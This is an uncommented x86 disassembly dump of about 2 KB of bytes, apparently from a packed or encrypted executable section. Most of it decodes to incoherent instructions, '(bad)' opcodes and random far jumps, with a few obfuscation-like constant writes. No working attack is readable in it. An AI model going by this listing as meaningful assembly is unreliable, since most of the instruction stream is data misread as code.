  40390b:	out    0x7e,eax
  40390d:	sbb    DWORD PTR [edi],ebx
  40390f:	inc    ecx
  403910:	in     al,dx
  403911:	lods   eax,DWORD PTR ds:[esi]
  403912:	loopne 0x403983
  403914:	inc    edi
  403915:	jge    0x403989
  403917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403918:	mov    dl,0xf
  40391a:	cli    
  40391b:	push   edi
  40391c:	mov    ds:0x88a65d70,eax
  403921:	push   edi
  403922:	pop    ebx
  403923:	pop    esi
  403924:	retf   0x42eb
  403927:	ds out 0x8e,al
  40392a:	test   al,0xcb
  40392c:	pop    es
  40392d:	addr16 dec ebx
  40392f:	push   edx
  403930:	stc    
  403931:	nop
  403932:	out    dx,eax
  403933:	jp     0x4038f8
  403935:	popf   
  403936:	xor    bh,BYTE PTR [ebp-0x49]
  403939:	adc    BYTE PTR [ebx+0x2c],dh
  40393c:	dec    edi
  40393d:	xor    DWORD PTR [edx],ebx
  40393f:	adc    DWORD PTR [esi-0x9],ecx
  403942:	mov    edi,0xef8ab998
  403947:	scas   eax,DWORD PTR es:[edi]
  403948:	inc    esp
  403949:	or     bl,BYTE PTR [ebx]
  40394b:	test   DWORD PTR [edi+0x33],0x4f5ddbf8
  403952:	les    eax,FWORD PTR [eax+0x5e291004]
  403958:	fisubr WORD PTR [ebx-0x3027ee01]
  40395e:	sub    BYTE PTR [edx+0x190869fc],bl
  403964:	inc    esp
  403965:	out    dx,al
  403966:	in     al,0x29
  403968:	ret    0xd892
  40396b:	stos   DWORD PTR es:[edi],eax
  40396c:	cmp    edx,DWORD PTR [eax+0x32b3198d]
  403972:	push   es
  403973:	xor    al,0xf5
  403975:	add    ah,dh
  403977:	sub    ch,BYTE PTR [edi-0x396b83cc]
  40397d:	aad    0x14
  40397f:	test   eax,0x4916cddc
  403984:	jnp    0x403986
  403986:	(bad)  
  403987:	cmp    bl,bl
  403989:	push   0x61
  40398b:	inc    esp
  40398c:	pop    es
  40398d:	aad    0xbd
  40398f:	sahf   
  403990:	test   ch,bh
  403992:	jmp    0x5d88:0x1a8e4e94
  403999:	xor    ebp,DWORD PTR [ecx]
  40399b:	and    bl,BYTE PTR [ebp-0x36193ca3]
  4039a1:	add    eax,0x6a2e4088
  4039a6:	popa   
  4039a7:	pop    eax
  4039a8:	xor    bh,BYTE PTR [eax+0x35]
  4039ab:	cmp    DWORD PTR ss:[ebx-0x63],esi
  4039af:	and    al,0xe9
  4039b1:	mov    al,ds:0x4ac24a90
  4039b6:	idiv   DWORD PTR [edx+0x3b]
  4039b9:	std    
  4039ba:	test   BYTE PTR [ecx+0x6d],dh
  4039bd:	or     al,0xba
  4039bf:	pop    edi
  4039c0:	sub    DWORD PTR [ecx-0x392d1749],eax
  4039c6:	scas   eax,DWORD PTR es:[edi]
  4039c7:	loopne 0x403a32
  4039c9:	out    dx,al
  4039ca:	inc    ebx
  4039cb:	pop    ebx
  4039cc:	lds    eax,FWORD PTR ss:[eax+0x11]
  4039d0:	mov    WORD PTR [eax-0x64f994d4],es
  4039d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4039d7:	push   ebp
  4039d8:	adc    DWORD PTR [ecx-0x35],ebx
  4039db:	call   0xd1fa852a
  4039e0:	repnz xchg esp,eax
  4039e2:	lea    ecx,[esi]
  4039e4:	push   ebx
  4039e5:	sbb    al,0xb5
  4039e7:	or     al,0x65
  4039e9:	rol    DWORD PTR [edx],0x30
  4039ec:	int3   
  4039ed:	sbb    ebp,DWORD PTR [edx+0x444a2e6e]
  4039f3:	scas   al,BYTE PTR es:[edi]
  4039f4:	hlt    
  4039f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039f6:	push   esp
  4039f7:	scas   al,BYTE PTR es:[edi]
  4039f8:	cld    
  4039f9:	dec    ebp
  4039fa:	sar    BYTE PTR [edi-0x5a],cl
  4039fd:	push   cs
  4039fe:	ret    
  4039ff:	mov    cl,0x1a
  403a01:	es add eax,0x60d83578
  403a07:	test   eax,0xcc3edd2a
  403a0c:	mov    WORD PTR [ebx-0x54],?
  403a0f:	ds xchg ch,ah
  403a12:	js     0x403a37
  403a14:	push   0x52
  403a16:	add    BYTE PTR [ecx+ebp*2-0x58],ch
  403a1a:	mov    ds,edx
  403a1c:	push   esi
  403a1d:	aas    
  403a1e:	push   edx
  403a1f:	add    DWORD PTR [ebx+0x5c],eax
  403a22:	inc    ebx
  403a23:	int3   
  403a24:	pop    eax
  403a25:	xchg   edi,eax
  403a26:	push   0x65
  403a28:	adc    eax,0x2f511a83
  403a2d:	pusha  
  403a2e:	sahf   
  403a2f:	stos   DWORD PTR es:[edi],eax
  403a30:	push   ebp
  403a31:	mov    DWORD PTR [edx-0x39357bca],edi
  403a37:	shl    BYTE PTR [eax],cl
  403a39:	jecxz  0x403a78
  403a3b:	adc    eax,0xc876af6f
  403a40:	out    dx,al
  403a41:	add    al,BYTE PTR [edx]
  403a43:	sbb    edi,ebx
  403a45:	jo     0x403a2b
  403a47:	popf   
  403a48:	push   0x75c5abcf
  403a4d:	and    dh,BYTE PTR [eax+ebx*1-0x5df9848e]
  403a54:	js     0x403ab1
  403a56:	test   ch,bh
  403a58:	fxam   
  403a5a:	loop   0x403aa2
  403a5c:	xlat   BYTE PTR ds:[ebx]
  403a5d:	es cmp cl,al
  403a60:	xor    edi,eax
  403a62:	in     al,0xc3
  403a64:	xchg   edx,eax
  403a65:	push   cs
  403a66:	loope  0x403aa7
  403a68:	and    eax,DWORD PTR [ecx+0x23]
  403a6b:	xor    edi,DWORD PTR [ebx]
  403a6d:	rol    BYTE PTR [eax-0x70],1
  403a70:	mov    ah,0x50
  403a72:	jne    0x403a36
  403a74:	inc    edi
  403a75:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a76:	cmc    
  403a77:	les    ebx,FWORD PTR [edx-0x5b514202]
  403a7d:	jae    0x403a32
  403a7f:	jecxz  0x403a83
  403a81:	mov    esp,0xcc263b80
  403a86:	(bad)  
  403a87:	cmp    al,0xb7
  403a89:	ja     0x403a73
  403a8b:	cli    
  403a8c:	fs scas al,BYTE PTR es:[edi]
  403a8e:	mov    esi,0x8e43863
  403a93:	sahf   
  403a94:	add    BYTE PTR [eax+0x7aa29de],dl
  403a9a:	jmp    0xb0c4:0x47ea1d56
  403aa1:	sbb    eax,0x5abdb846
  403aa6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403aa7:	call   0x9c8c2b54
  403aac:	arpl   sp,bp
  403aae:	inc    ax
  403ab0:	pop    edx
  403ab1:	push   ebx
  403ab2:	jecxz  0x403b10
  403ab4:	lds    edx,FWORD PTR [ebx+ecx*8]
  403ab7:	push   ebx
  403ab8:	xor    cl,BYTE PTR [ebx-0x33]
  403abb:	bound  esi,QWORD PTR [edi+0x47b54e93]
  403ac1:	repz cwde 
  403ac3:	arpl   WORD PTR ds:0x365fcef5,di
  403ac9:	imul   esi,eax,0x7f33dc62
  403acf:	pop    ecx
  403ad0:	mov    esp,0xff9c9386
  403ad5:	cmp    BYTE PTR [ebx+0x31432520],0x69
  403adc:	or     al,0x9d
  403ade:	lods   al,BYTE PTR ds:[esi]
  403adf:	jg     0x403a90
  403ae1:	loop   0x403b28
  403ae3:	sub    DWORD PTR [edx-0x783e1655],eax
  403ae9:	mov    bl,0x13
  403aeb:	call   0x458a:0x81dc2fd3
  403af2:	dec    DWORD PTR [edi]
  403af4:	mov    bh,0xd
  403af6:	jmp    0x403ade
  403af8:	inc    edx
  403af9:	add    BYTE PTR [ecx],dl
  403afb:	or     eax,0x42fd76
  403b00:	mov    ecx,DWORD PTR [ebp-0x10]
  403b03:	sub    DWORD PTR ds:0x42e124,0x77ef
  403b0d:	xor    al,0x47
  403b0f:	sub    al,0x37
  403b11:	and    DWORD PTR ds:0x42fcfd,0x33b1
  403b1b:	mov    BYTE PTR [ecx],al
  403b1d:	neg    DWORD PTR ds:0x42fcf5
  403b23:	mov    DWORD PTR [ebp-0x8],0xf89c8531
  403b2a:	jmp    0x403e8a
  403b2f:	fist   WORD PTR [esi+0x1]
  403b32:	cdq    
  403b33:	mov    cl,0x69
  403b35:	addr16 push edx
  403b37:	push   esi
  403b38:	and    DWORD PTR [ecx-0x2de21469],esi
  403b3e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403b3f:	lds    ebx,FWORD PTR [esi]
  403b41:	jo     0x403bb3
  403b43:	cmp    eax,0xcf70707d
  403b48:	sub    BYTE PTR [esi-0x1be0b6ff],ch
  403b4e:	pop    ss
  403b4f:	fadd   QWORD PTR [ecx*4-0x35281cf3]
  403b56:	mov    bp,0xd3d9
  403b5a:	mov    al,0xcd
  403b5c:	add    eax,0x5ea1b913
  403b61:	or     DWORD PTR [eax],edi
  403b63:	jne    0x403bd9
  403b65:	aam    0x36
  403b67:	fbld   TBYTE PTR [ebx-0xb]
  403b6a:	in     al,dx
  403b6b:	push   ss
  403b6c:	push   0xffffff95
  403b6e:	int3   
  403b6f:	sahf   
  403b70:	xor    BYTE PTR [edx-0x545e0965],al
  403b76:	addr16 pusha 
  403b78:	cmp    eax,0xdb2ed70e
  403b7d:	(bad)  [edi+0x4ab72f71]
  403b83:	nop
  403b84:	mov    edi,0xb0f1aed4
  403b89:	sar    BYTE PTR [eax-0x6],cl
  403b8c:	pop    ebx
  403b8d:	mov    al,0x21
  403b8f:	arpl   WORD PTR [ebp-0x11],bx
  403b92:	dec    edx
  403b93:	mov    ebx,0xeecabf19
  403b98:	push   edx
  403b99:	mov    ds:0xbd80a903,eax
  403b9e:	into   
  403b9f:	neg    edx
  403ba1:	or     dl,dh
  403ba3:	cwde   
  403ba4:	sti    
  403ba5:	ret    0xf588
  403ba8:	add    esi,DWORD PTR [edx]
  403baa:	rcl    DWORD PTR [ecx+edx*8+0x6ae1f1d8],1
  403bb1:	ins    BYTE PTR es:[edi],dx
  403bb2:	mov    esp,0x1348147e
  403bb7:	sbb    BYTE PTR [edi],ch
  403bb9:	stc    
  403bba:	jno    0x403b49
  403bbc:	out    dx,eax
  403bbd:	adc    eax,eax
  403bbf:	pop    esi
  403bc0:	inc    esi
  403bc1:	jns    0x403c01
  403bc3:	(bad)  
  403bc4:	pop    eax
  403bc5:	loope  0x403b80
  403bc7:	dec    eax
  403bc8:	jnp    0x403c13
  403bca:	clc    
  403bcb:	xchg   edx,eax
  403bcc:	push   ds
  403bcd:	push   0xc1a5204b
  403bd2:	fild   WORD PTR [eax+eax*8-0x4126123c]
  403bd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bda:	xchg   edi,eax
  403bdb:	mov    cl,0x5e
  403bdd:	repz repz aas 
  403be0:	adc    DWORD PTR [esi+ebp*4-0x76],ebp
  403be4:	xor    esp,ebx
  403be6:	test   eax,0xe0256353
  403beb:	mov    ecx,0x3df69b3a
  403bf0:	or     eax,0xaebff83f
  403bf5:	lods   eax,DWORD PTR ds:[esi]
  403bf6:	pop    ecx
  403bf7:	lds    ebx,FWORD PTR [ebp-0x43]
  403bfa:	or     DWORD PTR [ebx+0x1e69645],eax
  403c00:	cdq    
  403c01:	fist   DWORD PTR [ebp+ebp*1+0x66]
  403c05:	call   esp
  403c07:	(bad)  
  403c08:	xchg   ecx,eax
  403c09:	gs jne 0x403c1e
  403c0c:	adc    BYTE PTR [edx],ah
  403c0e:	mov    eax,0x81870dc3
  403c13:	imul   ecx,DWORD PTR [eax-0x72],0x76
  403c17:	push   esp
  403c18:	out    dx,al
  403c19:	in     al,0x9
  403c1b:	xchg   ecx,eax
  403c1c:	std    
  403c1d:	push   0x8dfb6a08
  403c22:	aaa    
  403c23:	es push 0x9b94309f
  403c29:	daa    
  403c2a:	jbe    0x403bc1
  403c2c:	dec    eax
  403c2d:	mov    eax,ds:0x8e06f725
  403c32:	std    
  403c33:	cmp    al,0x56
  403c35:	adc    edx,ebx
  403c37:	pushf  
  403c38:	inc    eax
  403c39:	xchg   ebp,eax
  403c3a:	shl    BYTE PTR [ecx],1
  403c3c:	leave  
  403c3d:	jl     0x403bf1
  403c3f:	dec    esp
  403c40:	ret    
  403c41:	adc    ah,ch
  403c43:	out    0xfe,al
  403c45:	leave  
  403c46:	mov    ecx,0x30ef2ff
  403c4b:	cmp    edi,DWORD PTR [edi]
  403c4d:	pop    eax
  403c4e:	(bad)  [ebp+ecx*1-0x401737ad]
  403c55:	add    ah,BYTE PTR [eax+0x5f]
  403c58:	(bad)  
  403c59:	(bad)  
  403c5a:	lahf   
  403c5b:	or     eax,0xdbbb4e4b
  403c60:	xor    al,0xe5
  403c62:	in     eax,dx
  403c63:	push   0x79653d25
  403c68:	mov    bh,BYTE PTR [edx+0x1275b4a6]
  403c6e:	aaa    
  403c6f:	std    
  403c70:	sub    al,0x7e
  403c72:	and    eax,0xb233b7b9
  403c77:	pop    ebp
  403c78:	test   BYTE PTR [ecx-0x2174a05f],cl
  403c7e:	inc    edi
  403c7f:	or     al,0x88
  403c81:	pop    ss
  403c82:	stc    
  403c83:	div    BYTE PTR [eax]
  403c85:	mov    dh,0x4c
  403c87:	add    al,0x73
  403c89:	or     eax,0xb797f2f6
  403c8e:	mov    ebp,0xc552dab8
  403c93:	ins    DWORD PTR es:[edi],dx
  403c94:	fisub  WORD PTR [ecx-0x25c48d5a]
  403c9a:	jns    0x403c58
  403c9c:	sub    ecx,DWORD PTR [ebp-0x23]
  403c9f:	push   ecx
  403ca0:	test   eax,0x8f54fbec
  403ca5:	or     DWORD PTR [ecx],eax
  403ca7:	(bad)  
  403ca9:	add    BYTE PTR [ebp+0x23c43608],al
  403caf:	fcomp  DWORD PTR [edx-0x58]
  403cb2:	test   dl,dh
  403cb4:	or     eax,0xdbcfad56
  403cb9:	das    
  403cba:	mov    bh,0x79
  403cbc:	aaa    
  403cbd:	pop    ss
  403cbe:	or     BYTE PTR [ecx],0xda
  403cc1:	mov    ah,0xa3
  403cc3:	sbb    esi,0x92534640
  403cc9:	sub    al,0x7f
  403ccb:	mov    eax,ds:0xc2f7d6be
  403cd0:	out    0x5d,al
  403cd2:	fs popf 
  403cd4:	jp     0x403cd6
  403cd6:	or     eax,0xd242ece3
  403cdb:	pop    es
  403cdc:	dec    ebp
  403cdd:	xor    ebp,DWORD PTR [eax]
  403cdf:	gs jnp 0x403d5c
  403ce2:	clc    
  403ce3:	jecxz  0x403cd8
  403ce5:	out    dx,eax
  403ce6:	adc    bh,BYTE PTR [esi+0x33]
  403ce9:	gs push ebp
  403ceb:	cli    
  403cec:	pop    ebp
  403ced:	out    dx,al
  403cee:	dec    ebx
  403cef:	cld    
  403cf0:	(bad)  
  403cf1:	out    dx,al
  403cf2:	sar    DWORD PTR [ecx+0x1e],cl
  403cf5:	mov    bl,0x18
  403cf7:	not    DWORD PTR [ebx]
  403cf9:	sti    
  403cfa:	lds    esp,FWORD PTR [esi-0x43]
  403cfd:	xchg   ecx,eax
  403cfe:	or     edx,DWORD PTR [ecx+esi*8+0x75226267]
  403d05:	inc    edi
  403d06:	in     eax,0xfe
  403d08:	push   ebx
  403d09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403d0a:	mov    edx,DWORD PTR [eax*1+0x59449c40]
  403d11:	nop
  403d12:	add    al,0x77
  403d14:	xor    DWORD PTR [ebx-0x7c5f1422],ecx
  403d1a:	fst    DWORD PTR [esi-0x62]
  403d1d:	ficomp WORD PTR [esi]
  403d1f:	sar    DWORD PTR [ecx],1
  403d21:	jg     0x403d16
  403d23:	nop
  403d24:	mov    ah,0xe1
  403d26:	fist   DWORD PTR ds:0xbbbaf0ab
  403d2c:	push   ss
  403d2d:	stos   DWORD PTR es:[edi],eax
  403d2e:	add    eax,0xba00587a
  403d33:	adc    DWORD PTR ss:[eax+eiz*8],ebp
  403d37:	cmp    al,0x95
  403d39:	rcl    BYTE PTR [edi],0x88
  403d3c:	test   eax,ebp
  403d3e:	sbb    ebx,esi
  403d40:	or     cl,0xad
  403d43:	add    al,0xa7
  403d45:	in     al,dx
  403d46:	jp     0x403d40
  403d48:	mov    dl,0x44
  403d4a:	js     0x403dc9
  403d4c:	fcmovu st,st(3)
  403d4e:	pop    esp
  403d4f:	dec    esi
  403d50:	out    0xb0,al
  403d52:	adc    eax,0x50c5e33c
  403d57:	jg     0x403d79
  403d59:	ja     0x403d78
  403d5b:	cs jge 0x403d95
  403d5e:	mov    dh,0x61
  403d60:	out    0xad,eax
  403d62:	and    eax,0xc67e37d9
  403d67:	mov    WORD PTR [edx+0x69507c47],fs
  403d6d:	fistp  WORD PTR [esi+0x7c]
  403d70:	mov    gs:0x9e5115f2,al
  403d76:	mov    ds:0x383655b2,eax
  403d7b:	test   eax,0xb69be2bd
  403d80:	bound  edi,QWORD PTR [edi]
  403d82:	sbb    eax,0x3d3e396e
  403d87:	or     al,0x28
  403d89:	out    dx,al
  403d8a:	mov    ecx,0xb6e9c87b
  403d8f:	in     eax,0xf2
  403d91:	sub    al,0xc9
  403d93:	ror    DWORD PTR [esi],1
  403d95:	sbb    edx,DWORD PTR [esi]
  403d97:	dec    eax
  403d98:	cmp    al,al
  403d9a:	mov    fs,ebx
  403d9c:	ffree  st(3)
  403d9e:	loope  0x403d2e
  403da0:	sbb    BYTE PTR ds:0x8efccd8b,cl
  403da6:	int3   
  403da7:	icebp  
  403da8:	dec    esi
  403da9:	push   edx
  403daa:	sbb    eax,0xc3d1f4e9
  403daf:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  403db1:	jp     0x403d7d
  403db3:	outs   dx,BYTE PTR ds:[esi]
  403db4:	and    dl,ch
  403db6:	out    0xd0,eax
  403db8:	push   ecx
  403db9:	stc    
  403dba:	addr16 inc ecx
  403dbc:	inc    esi
  403dbd:	xlat   BYTE PTR ds:[ebx]
  403dbe:	cs ss icebp 
  403dc1:	push   es
  403dc2:	pop    ecx
  403dc3:	bound  edx,QWORD PTR [ebp+0x40927ad5]
  403dc9:	and    eax,0xd5d8cac8
  403dce:	test   eax,0xcfd4f8ef
  403dd3:	pop    ss
  403dd4:	add    BYTE PTR [edi+ebx*2],bh
  403dd7:	dec    eax
  403dd8:	lods   al,BYTE PTR ds:[esi]
  403dd9:	gs mov esi,0x7d47d52a
  403ddf:	jl     0x403df0
  403de1:	nop
  403de2:	fisttp QWORD PTR [ebp-0x39fa0e21]
  403de8:	jnp    0x403e58
  403dea:	push   ds
  403deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403dec:	(bad)  
  403ded:	call   0x8771:0x861cdff4
  403df4:	pop    ebx
  403df5:	gs push ebp
  403df7:	sub    dl,BYTE PTR [esi-0x42da5b3b]
  403dfd:	sbb    al,BYTE PTR [edi+0x4d]
  403e00:	leave  
  403e01:	into   
  403e02:	sbb    DWORD PTR [ebp-0x7d],0xefc6a290
  403e09:	jle    0x403da4
  403e0b:	fisubr DWORD PTR [edx]
  403e0d:	mov    al,0x66
  403e0f:	(bad)  
  403e10:	mov    ebx,0xa09c806e
  403e15:	pop    ds
  403e16:	pop    ecx
  403e17:	xchg   ebx,esi
  403e19:	pusha  
  403e1a:	lahf   
  403e1b:	sub    DWORD PTR [ebx],edx
  403e1d:	jp     0x403e19
  403e1f:	and    edi,ebx
  403e21:	add    BYTE PTR [ebp+0x2d],0x4c
  403e25:	mov    cl,0xe5
  403e27:	scas   eax,DWORD PTR es:[edi]
  403e28:	xchg   ch,bl
  403e2a:	and    eax,0xb41fde25
  403e2f:	loop   0x403e86
  403e31:	adc    DWORD PTR [ebx+0x1846a1e1],esp
  403e37:	es push edi
  403e39:	jmp    0x403dd1
  403e3b:	push   cs
  403e3c:	mov    dh,BYTE PTR [ebx-0x3394fd31]
  403e42:	mov    ss,WORD PTR [esp+ecx*8]
  403e45:	mov    WORD PTR [ebx],cs
  403e47:	mov    ebx,DWORD PTR [edi+0x5d]
  403e4a:	adc    BYTE PTR [eax+0x7f],al
  403e4d:	pmaxub mm4,QWORD PTR [eax+0x29]
  403e51:	in     eax,dx
  403e52:	sub    eax,DWORD PTR [esi-0x7d]
  403e55:	rcr    DWORD PTR [edx+0x673f4566],0x8d
  403e5c:	jns    0x403e7d
  403e5e:	mov    ah,0x3d
  403e60:	mov    ebx,0x72759da7
  403e65:	jno    0x403e47
  403e67:	leave  
  403e68:	pop    edi
  403e69:	jns    0x403e68
  403e6b:	jmp    0x3c5e9fb2
  403e70:	mov    ds:0xf2e655d8,eax
  403e75:	pop    esi
  403e76:	ds sbb eax,0x7ee796b3
  403e7c:	jge    0x403e01
  403e7e:	mov    al,0x36
  403e80:	sub    dh,BYTE PTR [edx]
  403e82:	and    eax,0x60d505cd
  403e87:	sahf   
  403e88:	adc    dl,0xc7
  403e8b:	inc    ebp
  403e8c:	lock xor BYTE PTR [ebp+0x458bf89c],al
  403e93:	clc    
  403e94:	mov    ecx,0x7510855
  403e99:	push   esi
  403e9a:	xor    eax,ecx
  403e9c:	mov    esi,DWORD PTR ds:0x42e11c
  403ea2:	adc    DWORD PTR ds:0x42e70f,esi
  403ea8:	mov    esi,0x32729c
  403ead:	add    eax,esi
  403eaf:	mov    DWORD PTR ds:0x42fd72,0x1a92
  403eb9:	jmp    0x40423a
  403ebe:	mov    dl,BYTE PTR [ebp-0x1]
  403ec1:	mov    DWORD PTR ds:0x42fd05,0x5bb3
  403ecb:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403ecf:	mov    DWORD PTR ds:0x42e6ef,0x7752
  403ed9:	jmp    0x404239
  403ede:	jge    0x403ed6
  403ee0:	retf   0xf1c4
  403ee3:	in     al,0x15
  403ee5:	icebp  
  403ee6:	ss mov esp,0x91981c35
  403eec:	xchg   ebx,eax
  403eed:	rol    DWORD PTR [edx+0x3d70701b],cl
  403ef3:	jge    0x403f65
  403ef5:	jo     0x403ecc
  403ef7:	in     eax,dx
  403ef8:	mov    edi,0xd27fd9f7
  403efd:	ins    DWORD PTR es:[edi],dx
  403efe:	leave  
  403eff:	inc    ebp
  403f00:	in     eax,0xa6
  403f02:	sbb    BYTE PTR [esi-0x6f],ah
  403f05:	ss loopne 0x403eec
  403f08:	jo     0x403f13
  403f0a:	jl     0x403e9e
  403f0c:	mov    bh,0x12
  403f0e:	cmp    dh,BYTE PTR [ebx+ebp*1+0x1973ffe3]
  403f15:	adc    cl,BYTE PTR [ebx+0x40]
  403f18:	fiadd  DWORD PTR [eax+0x1c562714]
  403f1e:	jmp    0x1a9a:0xd4015bbe
  403f25:	add    eax,0x5a4e727d
  403f2a:	xchg   ecx,eax
  403f2b:	xchg   edi,eax
  403f2c:	push   ds
  403f2d:	sub    ebx,DWORD PTR [eax+0x5ba32041]
  403f33:	scas   al,BYTE PTR es:[edi]
  403f34:	cmp    eax,0x67741b49
  403f39:	rcr    BYTE PTR [edx],cl
  403f3b:	into   
  403f3c:	mov    ebx,0x162e2b71
  403f41:	jne    0x403ee1
  403f43:	push   cs
  403f44:	stos   DWORD PTR es:[edi],eax
  403f45:	mov    ds:0xd619a2e0,eax
  403f4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f4b:	add    al,0xd3
  403f4d:	inc    ebp
  403f4e:	mov    al,BYTE PTR [esi+0x1f]
  403f51:	in     eax,dx
  403f52:	ret    
  403f53:	bound  ebx,QWORD PTR [ecx]
  403f55:	lods   eax,DWORD PTR ds:[esi]
  403f56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f57:	mov    ebp,0xb40caed6
  403f5c:	stos   BYTE PTR es:[edi],al
  403f5d:	scas   eax,DWORD PTR es:[edi]
  403f5e:	mov    DWORD PTR [ebp-0x67],0xc78a5a0
  403f65:	sub    BYTE PTR [ecx],bl
  403f67:	dec    BYTE PTR [edx]
  403f69:	(bad)  
  403f6a:	jb     0x403f8a
  403f6c:	or     esp,DWORD PTR cs:[edx]
  403f6f:	add    DWORD PTR [ebx-0x3b],0x59cadb9a
  403f76:	fcmove st,st(0)
  403f78:	test   ebx,ebx
  403f7a:	jecxz  0x403fde
  403f7c:	test   BYTE PTR [eax-0x8],0x3c
  403f80:	and    al,0xdd
  403f82:	pop    ds
  403f83:	cmc    
  403f84:	mov    eax,0x506c4a38
  403f89:	jp     0x403f58
  403f8b:	inc    edx
  403f8c:	jle    0x403f37
  403f8e:	add    DWORD PTR [bx],esi
  403f91:	mov    al,0xf5
  403f93:	(bad)  
  403f94:	cmp    cl,BYTE PTR [ecx+0x4]
  403f97:	mov    fs,WORD PTR [eax]
  403f99:	push   ebx
  403f9b:	mov    ds:0x26c55aad,al
  403fa0:	jbe    0x403fe3
  403fa2:	sub    bl,dh
  403fa4:	out    dx,al
  403fa5:	xor    ch,BYTE PTR [eax+esi*4-0x18]
  403fa9:	mov    esi,0x9fcbf73c
  403fae:	xor    DWORD PTR [bx],esp
  403fb1:	popf   
  403fb2:	scas   al,BYTE PTR es:[edi]
  403fb3:	jns    0x404011
  403fb5:	jne    0x403f63
  403fb7:	pop    es
  403fb8:	icebp  
  403fb9:	js     0x403f56
  403fbb:	aam    0xb4
  403fbd:	xchg   edi,eax
  403fbe:	pop    esp
  403fbf:	sub    ecx,ecx
  403fc1:	adc    DWORD PTR [esi+ecx*4],0xffffffb3
  403fc5:	push   ebx
  403fc6:	mov    eax,ds:0xefcf799
  403fcb:	cdq    
  403fcc:	or     bl,bh
  403fce:	loop   0x403fb8
  403fd0:	pop    eax
  403fd1:	jecxz  0x403f7e
  403fd3:	sbb    eax,0x2ef77ca8
  403fd8:	dec    eax
  403fd9:	push   edx
  403fda:	out    0x95,al
  403fdc:	add    edi,eax
  403fde:	add    bl,BYTE PTR [ebp-0x72]
  403fe1:	pop    esp
  403fe2:	(bad)  
  403fe3:	in     al,0x75
  403fe5:	leave  
  403fe6:	arpl   WORD PTR [edx-0x61],ax
  403fe9:	add    eax,0x6bbb1089
  403fee:	cmc    
  403fef:	mov    es,WORD PTR [eax-0x1999f141]
  403ff5:	add    al,0x91
  403ff7:	push   eax
  403ff8:	sub    ebx,DWORD PTR [eax+0x19]
  403ffb:	je     0x403fdd
  403ffd:	dec    ecx
  403ffe:	aad    0xe3
  404000:	mov    dl,0xf5
  404002:	test   BYTE PTR [edi+0x48157bf0],0x7e
  404009:	in     al,0x45
  40400b:	adc    cl,BYTE PTR [edi+ebx*2]
  40400e:	push   es
  40400f:	sbb    BYTE PTR [ecx],ah
  404011:	outs   dx,BYTE PTR ds:[esi]
  404012:	rep ins DWORD PTR es:[edi],dx
  404014:	push   ebx
  404015:	fsubr  st,st(0)
  404017:	cmp    al,0x5d
  404019:	scas   al,BYTE PTR es:[edi]
  40401a:	mov    al,0x41
  40401c:	adc    DWORD PTR [edi],0x29d25f03
  404022:	xchg   ebp,eax
  404023:	cmp    eax,0xba8ff490
  404028:	mov    BYTE PTR [eax+0x32],al
  40402b:	xchg   esi,eax
  40402c:	add    DWORD PTR [ecx],eax
  40402e:	fisttp WORD PTR [ebp+edi*8-0x69]
  404032:	push   ss
  404033:	add    BYTE PTR [ebx+ecx*8+0x5c],0x3b
  404038:	or     al,0x9a
  40403a:	test   BYTE PTR [edi],bh
  40403c:	dec    ebx
  40403d:	outs   dx,DWORD PTR ds:[esi]
  40403e:	pop    edi
  40403f:	lahf   
  404040:	mov    cl,0x7b
  404042:	not    DWORD PTR [ebp-0x21]
  404045:	push   0xffffffe2
  404047:	nop
  404048:	xor    ecx,ecx
  40404a:	adc    al,0xff
  40404c:	les    edi,FWORD PTR [esi-0x46]
  40404f:	stos   BYTE PTR es:[edi],al
  404050:	mov    dh,0x38
  404052:	pop    ebp
  404053:	out    dx,al
  404054:	fs jmp 0xcd2b48cd
  40405a:	jno    0x40408a
  40405c:	ds push ebx
  40405e:	mov    esp,0xefa9a65a
  404063:	sbb    eax,0xa9174ed1
  404068:	xor    al,0x6c
  40406a:	mov    edx,0x6944b0f4
  40406f:	mov    al,ds:0x4971a1e5
  404074:	popa   
  404075:	xlat   BYTE PTR ds:[ebx]
  404076:	cld    
  404077:	adc    al,0xc9
  404079:	sbb    DWORD PTR [edi],edx
  40407b:	shl    DWORD PTR [edi+0x9],1
  40407e:	push   0x56
  404080:	push   edx
  404081:	mov    ecx,0x8637ce54
  404086:	outs   dx,BYTE PTR ds:[esi]
  404087:	(bad)  [eax-0x4e6e245a]
  40408d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40408e:	dec    ebx
  40408f:	xchg   esp,eax
  404090:	sub    eax,0x32e61344
  404095:	push   0xffffffa7
  404097:	jg     0x4040ad
  404099:	jbe    0x4040f6
  40409b:	mov    ah,0x90
  40409d:	cmp    DWORD PTR [edi],ebx
  40409f:	fisttp WORD PTR [edi+0x2a]
  4040a2:	sub    eax,0x7e67986d
  4040a7:	sub    al,0xd6
  4040a9:	dec    eax
  4040aa:	jb     0x4040b2
  4040ac:	cld    
  4040ad:	push   0xf12927ee
  4040b2:	loopne 0x4040b3
  4040b4:	scas   eax,DWORD PTR es:[edi]
  4040b5:	xchg   esi,eax
  4040b6:	pop    ebp
  4040b7:	aam    0xf
  4040b9:	add    ecx,DWORD PTR [edi-0x24]
  4040bc:	mov    eax,0xc8c5e1c1
  4040c1:	pop    ss
  4040c2:	(bad)  
  4040c3:	add    ecx,DWORD PTR [edi-0x71149caa]
  4040c9:	lock inc edi
  4040cb:	into   
  4040cc:	jo     0x40405c
  4040ce:	jecxz  0x40410a
  4040d0:	cmp    ah,bl
  4040d2:	adc    BYTE PTR [ebx+edi*1],dh
  4040d5:	xchg   ecx,eax
  4040d6:	(bad)  
  4040d7:	fnstcw WORD PTR [edi]
  4040d9:	push   0x352687ea
  4040de:	daa    
  4040df:	sub    al,0x38
  4040e1:	out    dx,eax
  4040e2:	and    al,0x1f
